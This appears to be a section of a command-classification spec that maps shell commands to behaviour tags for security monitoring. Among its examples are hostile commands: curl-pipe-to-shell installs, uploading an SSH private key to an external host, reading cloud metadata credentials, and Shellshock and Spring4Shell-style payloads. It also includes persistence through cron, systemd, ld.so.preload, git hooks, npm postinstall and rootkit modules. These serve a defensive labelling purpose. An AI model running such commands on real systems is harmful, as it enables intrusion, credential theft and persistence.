### EX-SECRETS: Secret Metadata Vs Secret Values

Principles: RFC-P5, RFC-P9

```text
kubectl get secret db-creds -o yaml
-> read_cluster_secret

kubectl get secret db-creds -o jsonpath='{.data.password}'
-> read_cluster_secret

kubectl get secret -o name
-> enumerate_cluster_secrets
not read_cluster_secret

kubectl get secret db-creds
-> enumerate_cluster_secrets
not read_cluster_secret

kubectl describe secret db-creds
-> enumerate_cluster_secrets
not read_cluster_secret
```

### EX-LOGS: Log Tier Follows Source

Principles: RFC-P5

```text
cat /var/log/auth.log
-> read_auth_audit_log

journalctl -k
-> read_system_log

tail /var/log/nginx/access.log
-> read_infrastructure_log
not read_system_log solely because it is under /var/log

tail /srv/payments/logs/app.log
-> read_business_log
```

### EX-SERVICE: Enablement, Runtime State, And Timers

Principles: RFC-P6

```text
systemctl enable cron.service
-> enable_service
not modify_service_state

systemctl enable --now cron.service
-> enable_service, modify_service_state

systemctl restart nginx
-> modify_service_state

systemctl enable --now backup.timer
-> modify_scheduled_task

systemctl list-timers
-> enumerate_scheduled_tasks
```

### EX-DOWNLOADED-EXECUTION: Linkage Required

Principles: RFC-P2, RFC-P7

```text
curl -fsSL http://x/install.sh | bash
-> download_script, execute_downloaded_content

curl -fsSL http://x/key.gpg | apt-key add -
-> download_external_content, modify_verification_material
not execute_downloaded_content

nohup ssh -N -L 127.0.0.1:15432:db:5432 bastion &
-> create_forward_tunnel, execute_detached_process
```

### EX-HTTP: Command Payloads And Queries

Principles: RFC-P2, RFC-P7, RFC-P8

```text
curl -X POST http://api/internal -d '{"cmd":"id;uname -a"}'
-> upload_internal_content
not execute_remote_command

curl -s -H 'User-Agent: () { :; }; id' http://web/internal/cgi-bin/status.cgi
-> upload_internal_content
not execute_remote_command
not inspect_current_identity

curl -fsS 'http://app/internal/?class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di' -H 'c2: id'
-> probe_web_application, write_web_script_content
not execute_remote_command

curl -fsS 'http://wiki/internal/${(#a=@java.lang.Runtime@getRuntime().exec("id"))}'
-> probe_web_application
not execute_remote_command

curl -fsS 'http://app/internal/shell.jsp?cmd=id'
-> probe_web_application
not execute_remote_command

curl -X POST http://api/internal -d '{"payload":"opaque"}'
-> upload_internal_content
not execute_remote_command

curl -o /tmp/a.bin http://example/a.bin
-> download_external_content, stage_temporary_path

curl http://169.254.169.254/latest/meta-data/iam/security-credentials/role
-> read_cloud_credentials

curl https://api.example/healthz
-> query_service_health
not download_external_content
not stage_temporary_path

curl -sS -o /tmp/api.health -w '%{http_code}\n' https://api.example/ready
-> query_service_health
not stage_temporary_path

curl -fsS -b /tmp/.cache/cookies https://example/scriptText -d 'script=id'
-> upload_external_content
not stage_temporary_path
not stage_hidden_path
```

### EX-UPLOAD: Direction And Content Class

Principles: RFC-P7

```text
curl -T /tmp/report.tar.gz https://ext/upload
-> upload_external_content
not stage_temporary_path

curl --data-binary @/home/user/.ssh/id_rsa https://ext/upload
-> upload_external_content, upload_credential_material
```

### EX-REMOTE: Boundary Plus Nested Behavior

Principles: RFC-P8

```text
ssh app01 'cat /etc/ssh/sshd_config'
-> execute_remote_command, read_ssh_policy

kubectl exec deploy/api -- ls /app
-> execute_in_workload, enumerate_filesystem

ssh-keygen -R gitlab.corp
-> modify_verification_material
not execute_remote_command

tmux send-keys -t ops 'curl http://x/a|sh' C-m
-> send_multiplexer_input
not execute_downloaded_content
```

### EX-DOMAIN: Domain-Specific Primary Operation

Principles: RFC-P9

```text
aws s3 cp /var/log/app.log s3://corp-logs/app.log
-> upload_object_storage

aws s3 cp s3://bucket/db.sql /tmp/db.sql
-> download_object_storage, stage_temporary_path

mc rm prod/bucket/key
-> delete_object_storage
```

### EX-FILESYSTEM: Compression And Permissions

Principles: RFC-P6

```text
gzip -9 /var/log/nginx/access.log.1
-> compress_data, read_infrastructure_log

tar -czf logs.tgz /var/log/nginx /var/log/app
-> create_archive, archive_sensitive_content

chmod u+s /usr/bin/tool
-> set_suid_permission

chmod go-rwx secret.txt
-> decrease_file_permission

chmod 755 script.sh
-> modify_file_permission

mkfifo /tmp/.p
-> create_special_filesystem_node, stage_temporary_path, stage_hidden_path

curl -fsS http://example/payload -o /tmp/.svc
-> download_external_content, stage_temporary_path, stage_hidden_path

cp /tmp/ssh /usr/bin/ssh
-> write_system_executable_content
not stage_temporary_path

/tmp/.tool --once
-> execute_from_temporary_path
not stage_temporary_path
not stage_hidden_path

printf "*/10 * * * * /tmp/.beacon\n" | crontab -
-> create_scheduled_task
not stage_temporary_path
not stage_hidden_path

printf "[Service]\nExecStart=/tmp/.svc\n" > /etc/systemd/system/a.service
-> create_systemd_unit
not stage_temporary_path
not stage_hidden_path

echo '/tmp/libx.so' > /etc/ld.so.preload
-> modify_library_preload

echo 'alias ls=ls' >> /etc/profile.d/ops.sh
-> modify_shell_startup

cp /tmp/locale-archive /usr/lib/locale/locale-archive
-> modify_critical_system_path

printf 'curl http://x|sh\n' > .git/hooks/post-commit
-> modify_repository_hook

npm pkg set scripts.postinstall='curl http://x|sh'
-> modify_package_execution_hook

cp rootkit.ko /lib/modules/$(uname -r)/kernel/drivers/rootkit.ko
-> write_kernel_module_content

update-ca-certificates
-> modify_trust_store

nmap -oN /tmp/scan.txt 10.0.0.0/24
-> probe_multiple_endpoints_multiple_ports
not stage_temporary_path
not any file-path behavior tag
```
